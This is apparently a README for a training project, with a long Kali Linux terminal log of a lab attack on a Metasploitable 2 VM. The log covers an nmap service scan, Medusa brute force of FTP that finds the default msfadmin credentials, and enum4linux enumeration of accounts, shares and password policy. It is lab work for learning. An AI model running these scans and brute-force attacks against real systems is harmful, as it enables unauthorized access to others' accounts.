# Simulando-um-Ataque-de-Brute-Force-de-Senhas-com-Medusa-e-Kali-Linux
Implementar, documentar e compartilhar um projeto prático utilizando Kali Linux e a ferramenta Medusa, em conjunto com ambientes vulneráveis (por exemplo, Metasploitable 2 e DVWA), para simular cenários de ataque de força bruta e exercitar medidas de prevenção.
(kali㉿kali)-[~]
└─$ ifconfing 192.168.213.3
Command 'ifconfing' not found, did you mean:
  command 'ifconfig' from deb net-tools
Try: sudo apt install <deb name>
                                                                             
┌──(kali㉿kali)-[~]
└─$ ip a                   
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:1f:b7:23 brd ff:ff:ff:ff:ff:ff
    inet 192.168.213.4/24 brd 192.168.213.255 scope global dynamic noprefixroute eth0
       valid_lft 410sec preferred_lft 410sec
    inet6 fe80::6512:5548:835c:227f/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
                                                                             
┌──(kali㉿kali)-[~]
└─$ ping -c 192.168.213.3 
ping: invalid argument: '192.168.213.3'
                                                                             
┌──(kali㉿kali)-[~]
└─$ ping -c 3 192.168.213.3
PING 192.168.213.3 (192.168.213.3) 56(84) bytes of data.
64 bytes from 192.168.213.3: icmp_seq=1 ttl=64 time=4.13 ms
64 bytes from 192.168.213.3: icmp_seq=2 ttl=64 time=1.40 ms
64 bytes from 192.168.213.3: icmp_seq=3 ttl=64 time=1.39 ms

--- 192.168.213.3 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 1.394/2.306/4.129/1.288 ms
                                                                             
┌──(kali㉿kali)-[~]
└─$ ping -c 5 192.168.213.3 
PING 192.168.213.3 (192.168.213.3) 56(84) bytes of data.
64 bytes from 192.168.213.3: icmp_seq=1 ttl=64 time=15.7 ms
64 bytes from 192.168.213.3: icmp_seq=2 ttl=64 time=3.14 ms
64 bytes from 192.168.213.3: icmp_seq=3 ttl=64 time=5.88 ms
64 bytes from 192.168.213.3: icmp_seq=4 ttl=64 time=1.24 ms
64 bytes from 192.168.213.3: icmp_seq=5 ttl=64 time=7.69 ms

--- 192.168.213.3 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4011ms
rtt min/avg/max/mdev = 1.235/6.731/15.715/5.009 ms
                                                                             
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p 21.22.80.445.139 192.168.213.3
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-21 09:12 EST
Error #487: Your port specifications are illegal.  Example of proper form: "-100,200-1024,T:3000-4000,U:60000-"
QUITTING!
                                                                             
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p 21,22,80,445,139 192.168.213.3
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-21 09:13 EST
Nmap scan report for 192.168.213.3
Host is up (0.0079s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 08:00:27:D4:B7:A2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.40 seconds
                                                                             
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.213.3
Connected to 192.168.213.3.
220 (vsFTPd 2.3.4)
Name (192.168.213.3:kali): 
331 Please specify the password.
Password: 

530 Login incorrect.
ftp: Login failed
ftp> 
ftp> 
ftp> quit
221 Goodbye.
                                                                             
┌──(kali㉿kali)-[~]
└─$ echo -e "user\nmsfadmin\nadmin\root" > users.txt
                                                                             
┌──(kali㉿kali)-[~]
└─$ echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
                                                                             
┌──(kali㉿kali)-[~]
└─$ medusa -h 192.168.213.3 -u users.txt -p pass.txt -M ftp -t 6
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-11-21 09:34:15 ACCOUNT CHECK: [ftp] Host: 192.168.213.3 (1 of 1, 0 complete) User: users.txt (1 of 1, 0 complete) Password: pass.txt (1 of 1 complete)
                                                                                                               
┌──(kali㉿kali)-[~]
└─$ medusa -h 192.168.213.3 -u users.txt -p pass.txt -M ftp -t6 
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-11-21 09:35:19 ACCOUNT CHECK: [ftp] Host: 192.168.213.3 (1 of 1, 0 complete) User: users.txt (1 of 1, 0 complete) Password: pass.txt (1 of 1 complete)
                                                                                                               
┌──(kali㉿kali)-[~]
└─$ medusa -h 192.168.213.3 -u users.txt -p pass.txt -M ftp -t 6
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-11-21 09:36:09 ACCOUNT CHECK: [ftp] Host: 192.168.213.3 (1 of 1, 0 complete) User: users.txt (1 of 1, 0 complete) Password: pass.txt (1 of 1 complete)
                                                                                                               
┌──(kali㉿kali)-[~]
└─$ medusa -h 192.168.213.3 -U users.txt -p pass.txt -M ftp -t 6 
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

oot (3 of 3, 2 complete) Password: pass.txt (1 of 1 complete)(1 of 1, 0 complete) User: admin
2025-11-21 09:39:39 ACCOUNT CHECK: [ftp] Host: 192.168.213.3 (1 of 1, 0 complete) User: msfadmin (2 of 3, 3 complete) Password: pass.txt (1 of 1 complete)
2025-11-21 09:39:39 ACCOUNT CHECK: [ftp] Host: 192.168.213.3 (1 of 1, 0 complete) User: user (1 of 3, 3 complete) Password: pass.txt (1 of 1 complete)
                                                                                                               
┌──(kali㉿kali)-[~]
└─$ medusa -h 192.168.213.3 -U users.txt -P pass.txt -M ftp -T 6
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-11-21 09:40:50 ACCOUNT CHECK: [ftp] Host: 192.168.213.3 (1 of 1, 0 complete) User: user (1 of 3, 0 complete) Password: 123456 (1 of 4 complete)
2025-11-21 09:40:53 ACCOUNT CHECK: [ftp] Host: 192.168.213.3 (1 of 1, 0 complete) User: user (1 of 3, 0 complete) Password: password (2 of 4 complete)
2025-11-21 09:40:56 ACCOUNT CHECK: [ftp] Host: 192.168.213.3 (1 of 1, 0 complete) User: user (1 of 3, 0 complete) Password: qwerty (3 of 4 complete)
2025-11-21 09:40:58 ACCOUNT CHECK: [ftp] Host: 192.168.213.3 (1 of 1, 0 complete) User: user (1 of 3, 0 complete) Password: msfadmin (4 of 4 complete)
2025-11-21 09:41:02 ACCOUNT CHECK: [ftp] Host: 192.168.213.3 (1 of 1, 0 complete) User: msfadmin (2 of 3, 1 complete) Password: 123456 (1 of 4 complete)
2025-11-21 09:41:05 ACCOUNT CHECK: [ftp] Host: 192.168.213.3 (1 of 1, 0 complete) User: msfadmin (2 of 3, 1 complete) Password: password (2 of 4 complete)
2025-11-21 09:41:08 ACCOUNT CHECK: [ftp] Host: 192.168.213.3 (1 of 1, 0 complete) User: msfadmin (2 of 3, 1 complete) Password: qwerty (3 of 4 complete)
2025-11-21 09:41:08 ACCOUNT CHECK: [ftp] Host: 192.168.213.3 (1 of 1, 0 complete) User: msfadmin (2 of 3, 1 complete) Password: msfadmin (4 of 4 complete)
2025-11-21 09:41:08 ACCOUNT FOUND: [ftp] Host: 192.168.213.3 User: msfadmin Password: msfadmin [SUCCESS]
oot (3 of 3, 2 complete) Password: 123456 (1 of 4 complete)3 (1 of 1, 0 complete) User: admin
oot (3 of 3, 2 complete) Password: password (2 of 4 complete)(1 of 1, 0 complete) User: admin
oot (3 of 3, 2 complete) Password: qwerty (3 of 4 complete)3 (1 of 1, 0 complete) User: admin
oot (3 of 3, 2 complete) Password: msfadmin (4 of 4 complete)(1 of 1, 0 complete) User: admin
                                                                                                               
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.213.3
Connected to 192.168.213.3.
220 (vsFTPd 2.3.4)
Name (192.168.213.3:kali): msfadmin
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

┌──(kali㉿kali)-[~]
└─$ emu4linux -a 192.168.213.3 | tee enum4_output.txt
emu4linux: command not found
                                                                             
┌──(kali㉿kali)-[~]
└─$ enum4linux -a 192.168.213.3 | tee enum4_output.txt
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Nov 21 21:11:18 2025

 =========================================( Target Information )=========================================

Target ........... 192.168.213.3
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 192.168.213.3 )===========================


[+] Got domain/workgroup name: WORKGROUP


 ===============================( Nbtstat Information for 192.168.213.3 )===============================                                                  
                                                                             
Looking up status of 192.168.213.3                                           
        METASPLOITABLE  <00> -         B <ACTIVE>  Workstation Service
        METASPLOITABLE  <03> -         B <ACTIVE>  Messenger Service
        METASPLOITABLE  <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ===================================( Session Check on 192.168.213.3 )===================================                                                 
                                                                             
                                                                             
[+] Server 192.168.213.3 allows sessions using username '', password ''      
                                                                             
                                                                             
 ================================( Getting domain SID for 192.168.213.3 )================================                                                 
                                                                             
Domain Name: WORKGROUP                                                       
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup         
                                                                             
                                                                             
 ==================================( OS information on 192.168.213.3 )==================================                                                  
                                                                             
                                                                             
[E] Can't get OS info with smbclient                                         
                                                                             
                                                                             
[+] Got OS info for 192.168.213.3 from srvinfo:                              
        METASPLOITABLE Wk Sv PrQ Unx NT SNT metasploitable server (Samba 3.0.20-Debian)
        platform_id     :       500
        os version      :       4.9
        server type     :       0x9a03


 =======================================( Users on 192.168.213.3 )=======================================                                                 
                                                                             
index: 0x1 RID: 0x3f2 acb: 0x00000011 Account: games    Name: games     Desc: (null)
index: 0x2 RID: 0x1f5 acb: 0x00000011 Account: nobody   Name: nobody    Desc: (null)
index: 0x3 RID: 0x4ba acb: 0x00000011 Account: bind     Name: (null)    Desc: (null)
index: 0x4 RID: 0x402 acb: 0x00000011 Account: proxy    Name: proxy     Desc: (null)
index: 0x5 RID: 0x4b4 acb: 0x00000011 Account: syslog   Name: (null)    Desc: (null)
index: 0x6 RID: 0xbba acb: 0x00000010 Account: user     Name: just a user,111,,      Desc: (null)
index: 0x7 RID: 0x42a acb: 0x00000011 Account: www-data Name: www-data  Desc: (null)
index: 0x8 RID: 0x3e8 acb: 0x00000011 Account: root     Name: root      Desc: (null)
index: 0x9 RID: 0x3fa acb: 0x00000011 Account: news     Name: news      Desc: (null)
index: 0xa RID: 0x4c0 acb: 0x00000011 Account: postgres Name: PostgreSQL administrator,,,    Desc: (null)
index: 0xb RID: 0x3ec acb: 0x00000011 Account: bin      Name: bin       Desc: (null)
index: 0xc RID: 0x3f8 acb: 0x00000011 Account: mail     Name: mail      Desc: (null)
index: 0xd RID: 0x4c6 acb: 0x00000011 Account: distccd  Name: (null)    Desc: (null)
index: 0xe RID: 0x4ca acb: 0x00000011 Account: proftpd  Name: (null)    Desc: (null)
index: 0xf RID: 0x4b2 acb: 0x00000011 Account: dhcp     Name: (null)    Desc: (null)
index: 0x10 RID: 0x3ea acb: 0x00000011 Account: daemon  Name: daemon    Desc: (null)
index: 0x11 RID: 0x4b8 acb: 0x00000011 Account: sshd    Name: (null)    Desc: (null)
index: 0x12 RID: 0x3f4 acb: 0x00000011 Account: man     Name: man       Desc: (null)
index: 0x13 RID: 0x3f6 acb: 0x00000011 Account: lp      Name: lp        Desc: (null)
index: 0x14 RID: 0x4c2 acb: 0x00000011 Account: mysql   Name: MySQL Server,,,Desc: (null)
index: 0x15 RID: 0x43a acb: 0x00000011 Account: gnats   Name: Gnats Bug-Reporting System (admin)     Desc: (null)
index: 0x16 RID: 0x4b0 acb: 0x00000011 Account: libuuid Name: (null)    Desc: (null)
index: 0x17 RID: 0x42c acb: 0x00000011 Account: backup  Name: backup    Desc: (null)
index: 0x18 RID: 0xbb8 acb: 0x00000010 Account: msfadmin        Name: msfadmin,,,    Desc: (null)
index: 0x19 RID: 0x4c8 acb: 0x00000011 Account: telnetd Name: (null)    Desc: (null)
index: 0x1a RID: 0x3ee acb: 0x00000011 Account: sys     Name: sys       Desc: (null)
index: 0x1b RID: 0x4b6 acb: 0x00000011 Account: klog    Name: (null)    Desc: (null)
index: 0x1c RID: 0x4bc acb: 0x00000011 Account: postfix Name: (null)    Desc: (null)
index: 0x1d RID: 0xbbc acb: 0x00000011 Account: service Name: ,,,       Desc: (null)
index: 0x1e RID: 0x434 acb: 0x00000011 Account: list    Name: Mailing List Manager   Desc: (null)
index: 0x1f RID: 0x436 acb: 0x00000011 Account: irc     Name: ircd      Desc: (null)
index: 0x20 RID: 0x4be acb: 0x00000011 Account: ftp     Name: (null)    Desc: (null)
index: 0x21 RID: 0x4c4 acb: 0x00000011 Account: tomcat55        Name: (null)Desc: (null)
index: 0x22 RID: 0x3f0 acb: 0x00000011 Account: sync    Name: sync      Desc: (null)
index: 0x23 RID: 0x3fc acb: 0x00000011 Account: uucp    Name: uucp      Desc: (null)

user:[games] rid:[0x3f2]
user:[nobody] rid:[0x1f5]
user:[bind] rid:[0x4ba]
user:[proxy] rid:[0x402]
user:[syslog] rid:[0x4b4]
user:[user] rid:[0xbba]
user:[www-data] rid:[0x42a]
user:[root] rid:[0x3e8]
user:[news] rid:[0x3fa]
user:[postgres] rid:[0x4c0]
user:[bin] rid:[0x3ec]
user:[mail] rid:[0x3f8]
user:[distccd] rid:[0x4c6]
user:[proftpd] rid:[0x4ca]
user:[dhcp] rid:[0x4b2]
user:[daemon] rid:[0x3ea]
user:[sshd] rid:[0x4b8]
user:[man] rid:[0x3f4]
user:[lp] rid:[0x3f6]
user:[mysql] rid:[0x4c2]
user:[gnats] rid:[0x43a]
user:[libuuid] rid:[0x4b0]
user:[backup] rid:[0x42c]
user:[msfadmin] rid:[0xbb8]
user:[telnetd] rid:[0x4c8]
user:[sys] rid:[0x3ee]
user:[klog] rid:[0x4b6]
user:[postfix] rid:[0x4bc]
user:[service] rid:[0xbbc]
user:[list] rid:[0x434]
user:[irc] rid:[0x436]
user:[ftp] rid:[0x4be]
user:[tomcat55] rid:[0x4c4]
user:[sync] rid:[0x3f0]
user:[uucp] rid:[0x3fc]

 =================================( Share Enumeration on 192.168.213.3 )=================================                                                 
                                                                             
                                                                             
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            METASPLOITABLE

[+] Attempting to map shares on 192.168.213.3                                
                                                                             
//192.168.213.3/print$  Mapping: DENIED Listing: N/A Writing: N/A            
//192.168.213.3/tmp     Mapping: OK Listing: OK Writing: N/A
//192.168.213.3/opt     Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:                                               
                                                                             
NT_STATUS_NETWORK_ACCESS_DENIED listing \*                                   
//192.168.213.3/IPC$    Mapping: N/A Listing: N/A Writing: N/A
//192.168.213.3/ADMIN$  Mapping: DENIED Listing: N/A Writing: N/A

 ===========================( Password Policy Information for 192.168.213.3 )===========================                                                  
                                                                             
                                                                             

[+] Attaching to 192.168.213.3 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] METASPLOITABLE
        [+] Builtin

[+] Password Info for Domain: METASPLOITABLE

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:                         
                                                                             
                                                                             
Password Complexity: Disabled                                                
Minimum Password Length: 0


 ======================================( Groups on 192.168.213.3 )======================================                                                  
                                                                             
                                                                             
[+] Getting builtin groups:                                                  
                                                                             
                                                                             
[+]  Getting builtin group memberships:                                      
                                                                             
                                                                             
[+]  Getting local groups:                                                   
                                                                             
                                                                             
[+]  Getting local group memberships:                                        
                                                                             
                                                                             
[+]  Getting domain groups:                                                  
                                                                             
                                                                             
[+]  Getting domain group memberships:                                       
                                                                             
                                                                             
 ==================( Users on 192.168.213.3 via RID cycling (RIDS: 500-550,1000-1050) )==================                                                 
                                                                             
                                                                             
[I] Found new SID:                                                           
S-1-5-21-1042354039-2475377354-766472396                                     

[+] Enumerating users using SID S-1-5-21-1042354039-2475377354-766472396 and logon username '', password ''                                               
                                                                             
S-1-5-21-1042354039-2475377354-766472396-500 METASPLOITABLE\Administrator (Local User)
S-1-5-21-1042354039-2475377354-766472396-501 METASPLOITABLE\nobody (Local User)
S-1-5-21-1042354039-2475377354-766472396-512 METASPLOITABLE\Domain Admins (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-513 METASPLOITABLE\Domain Users (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-514 METASPLOITABLE\Domain Guests (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1000 METASPLOITABLE\root (Local User)
S-1-5-21-1042354039-2475377354-766472396-1001 METASPLOITABLE\root (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1002 METASPLOITABLE\daemon (Local User)
S-1-5-21-1042354039-2475377354-766472396-1003 METASPLOITABLE\daemon (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1004 METASPLOITABLE\bin (Local User)
S-1-5-21-1042354039-2475377354-766472396-1005 METASPLOITABLE\bin (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1006 METASPLOITABLE\sys (Local User)
S-1-5-21-1042354039-2475377354-766472396-1007 METASPLOITABLE\sys (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1008 METASPLOITABLE\sync (Local User)
S-1-5-21-1042354039-2475377354-766472396-1009 METASPLOITABLE\adm (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1010 METASPLOITABLE\games (Local User)
S-1-5-21-1042354039-2475377354-766472396-1011 METASPLOITABLE\tty (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1012 METASPLOITABLE\man (Local User)
S-1-5-21-1042354039-2475377354-766472396-1013 METASPLOITABLE\disk (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1014 METASPLOITABLE\lp (Local User)
S-1-5-21-1042354039-2475377354-766472396-1015 METASPLOITABLE\lp (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1016 METASPLOITABLE\mail (Local User)
S-1-5-21-1042354039-2475377354-766472396-1017 METASPLOITABLE\mail (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1018 METASPLOITABLE\news (Local User)
S-1-5-21-1042354039-2475377354-766472396-1019 METASPLOITABLE\news (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1020 METASPLOITABLE\uucp (Local User)
S-1-5-21-1042354039-2475377354-766472396-1021 METASPLOITABLE\uucp (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1025 METASPLOITABLE\man (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1026 METASPLOITABLE\proxy (Local User)
S-1-5-21-1042354039-2475377354-766472396-1027 METASPLOITABLE\proxy (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1031 METASPLOITABLE\kmem (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1041 METASPLOITABLE\dialout (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1043 METASPLOITABLE\fax (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1045 METASPLOITABLE\voice (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1049 METASPLOITABLE\cdrom (Domain Group)

 ===============================( Getting printer info for 192.168.213.3 )===============================
                                                                                                                                      
No printers returned.                                                                                                                 


enum4linux complete on Fri Nov 21 21:12:20 2025

                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ less enum4_output.txt
"enum4_output.txt" may be a binary file.  See it anyway? 
                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ enum4linux -a 192.168.213.3 | tee enum4_output.txt

Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Nov 21 21:13:30 2025

 =========================================( Target Information )=========================================
                                                                                                                                      
Target ........... 192.168.213.3                                                                                                      
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 192.168.213.3 )===========================
                                                                                                                                      
                                                                                                                                      
[+] Got domain/workgroup name: WORKGROUP                                                                                              
                                                                                                                                      
                                                                                                                                      
 ===============================( Nbtstat Information for 192.168.213.3 )===============================
                                                                                                                                      
Looking up status of 192.168.213.3                                                                                                    
        METASPLOITABLE  <00> -         B <ACTIVE>  Workstation Service
        METASPLOITABLE  <03> -         B <ACTIVE>  Messenger Service
        METASPLOITABLE  <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ===================================( Session Check on 192.168.213.3 )===================================
                                                                                                                                      
                                                                                                                                      
[+] Server 192.168.213.3 allows sessions using username '', password ''                                                               
                                                                                                                                      
                                                                                                                                      
 ================================( Getting domain SID for 192.168.213.3 )================================
                                                                                                                                      
Domain Name: WORKGROUP                                                                                                                
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                                                                  
                                                                                                                                      
                                                                                                                                      
 ==================================( OS information on 192.168.213.3 )==================================
                                                                                                                                      
                                                                                                                                      
[E] Can't get OS info with smbclient                                                                                                  
                                                                                                                                      
                                                                                                                                      
[+] Got OS info for 192.168.213.3 from srvinfo:                                                                                       
        METASPLOITABLE Wk Sv PrQ Unx NT SNT metasploitable server (Samba 3.0.20-Debian)                                               
        platform_id     :       500
        os version      :       4.9
        server type     :       0x9a03


 =======================================( Users on 192.168.213.3 )=======================================
                                                                                                                                      
index: 0x1 RID: 0x3f2 acb: 0x00000011 Account: games    Name: games     Desc: (null)                                                  
index: 0x2 RID: 0x1f5 acb: 0x00000011 Account: nobody   Name: nobody    Desc: (null)
index: 0x3 RID: 0x4ba acb: 0x00000011 Account: bind     Name: (null)    Desc: (null)
index: 0x4 RID: 0x402 acb: 0x00000011 Account: proxy    Name: proxy     Desc: (null)
index: 0x5 RID: 0x4b4 acb: 0x00000011 Account: syslog   Name: (null)    Desc: (null)
index: 0x6 RID: 0xbba acb: 0x00000010 Account: user     Name: just a user,111,, Desc: (null)
index: 0x7 RID: 0x42a acb: 0x00000011 Account: www-data Name: www-data  Desc: (null)
index: 0x8 RID: 0x3e8 acb: 0x00000011 Account: root     Name: root      Desc: (null)
index: 0x9 RID: 0x3fa acb: 0x00000011 Account: news     Name: news      Desc: (null)
index: 0xa RID: 0x4c0 acb: 0x00000011 Account: postgres Name: PostgreSQL administrator,,,       Desc: (null)
index: 0xb RID: 0x3ec acb: 0x00000011 Account: bin      Name: bin       Desc: (null)
index: 0xc RID: 0x3f8 acb: 0x00000011 Account: mail     Name: mail      Desc: (null)
index: 0xd RID: 0x4c6 acb: 0x00000011 Account: distccd  Name: (null)    Desc: (null)
index: 0xe RID: 0x4ca acb: 0x00000011 Account: proftpd  Name: (null)    Desc: (null)
index: 0xf RID: 0x4b2 acb: 0x00000011 Account: dhcp     Name: (null)    Desc: (null)
index: 0x10 RID: 0x3ea acb: 0x00000011 Account: daemon  Name: daemon    Desc: (null)
index: 0x11 RID: 0x4b8 acb: 0x00000011 Account: sshd    Name: (null)    Desc: (null)
index: 0x12 RID: 0x3f4 acb: 0x00000011 Account: man     Name: man       Desc: (null)
index: 0x13 RID: 0x3f6 acb: 0x00000011 Account: lp      Name: lp        Desc: (null)
index: 0x14 RID: 0x4c2 acb: 0x00000011 Account: mysql   Name: MySQL Server,,,   Desc: (null)
index: 0x15 RID: 0x43a acb: 0x00000011 Account: gnats   Name: Gnats Bug-Reporting System (admin)        Desc: (null)
index: 0x16 RID: 0x4b0 acb: 0x00000011 Account: libuuid Name: (null)    Desc: (null)
index: 0x17 RID: 0x42c acb: 0x00000011 Account: backup  Name: backup    Desc: (null)
index: 0x18 RID: 0xbb8 acb: 0x00000010 Account: msfadmin        Name: msfadmin,,,       Desc: (null)
index: 0x19 RID: 0x4c8 acb: 0x00000011 Account: telnetd Name: (null)    Desc: (null)
index: 0x1a RID: 0x3ee acb: 0x00000011 Account: sys     Name: sys       Desc: (null)
index: 0x1b RID: 0x4b6 acb: 0x00000011 Account: klog    Name: (null)    Desc: (null)
index: 0x1c RID: 0x4bc acb: 0x00000011 Account: postfix Name: (null)    Desc: (null)
index: 0x1d RID: 0xbbc acb: 0x00000011 Account: service Name: ,,,       Desc: (null)
index: 0x1e RID: 0x434 acb: 0x00000011 Account: list    Name: Mailing List Manager      Desc: (null)
index: 0x1f RID: 0x436 acb: 0x00000011 Account: irc     Name: ircd      Desc: (null)
index: 0x20 RID: 0x4be acb: 0x00000011 Account: ftp     Name: (null)    Desc: (null)
index: 0x21 RID: 0x4c4 acb: 0x00000011 Account: tomcat55        Name: (null)    Desc: (null)
index: 0x22 RID: 0x3f0 acb: 0x00000011 Account: sync    Name: sync      Desc: (null)
index: 0x23 RID: 0x3fc acb: 0x00000011 Account: uucp    Name: uucp      Desc: (null)

user:[games] rid:[0x3f2]
user:[nobody] rid:[0x1f5]
user:[bind] rid:[0x4ba]
user:[proxy] rid:[0x402]
user:[syslog] rid:[0x4b4]
user:[user] rid:[0xbba]
user:[www-data] rid:[0x42a]
user:[root] rid:[0x3e8]
user:[news] rid:[0x3fa]
user:[postgres] rid:[0x4c0]
user:[bin] rid:[0x3ec]
user:[mail] rid:[0x3f8]
user:[distccd] rid:[0x4c6]
user:[proftpd] rid:[0x4ca]
user:[dhcp] rid:[0x4b2]
user:[daemon] rid:[0x3ea]
user:[sshd] rid:[0x4b8]
user:[man] rid:[0x3f4]
user:[lp] rid:[0x3f6]
user:[mysql] rid:[0x4c2]
user:[gnats] rid:[0x43a]
user:[libuuid] rid:[0x4b0]
user:[backup] rid:[0x42c]
user:[msfadmin] rid:[0xbb8]
user:[telnetd] rid:[0x4c8]
user:[sys] rid:[0x3ee]
user:[klog] rid:[0x4b6]
user:[postfix] rid:[0x4bc]
user:[service] rid:[0xbbc]
user:[list] rid:[0x434]
user:[irc] rid:[0x436]
user:[ftp] rid:[0x4be]
user:[tomcat55] rid:[0x4c4]
user:[sync] rid:[0x3f0]
user:[uucp] rid:[0x3fc]

 =================================( Share Enumeration on 192.168.213.3 )=================================
                                                                                                                                      
                                                                                                                                      
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            METASPLOITABLE

[+] Attempting to map shares on 192.168.213.3                                                                                         
                                                                                                                                      
//192.168.213.3/print$  Mapping: DENIED Listing: N/A Writing: N/A                                                                     
//192.168.213.3/tmp     Mapping: OK Listing: OK Writing: N/A
//192.168.213.3/opt     Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:                                                                                                        
                                                                                                                                      
NT_STATUS_NETWORK_ACCESS_DENIED listing \*                                                                                            
//192.168.213.3/IPC$    Mapping: N/A Listing: N/A Writing: N/A
//192.168.213.3/ADMIN$  Mapping: DENIED Listing: N/A Writing: N/A

 ===========================( Password Policy Information for 192.168.213.3 )===========================
                                                                                                                                      
                                                                                                                                      

[+] Attaching to 192.168.213.3 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] METASPLOITABLE
        [+] Builtin

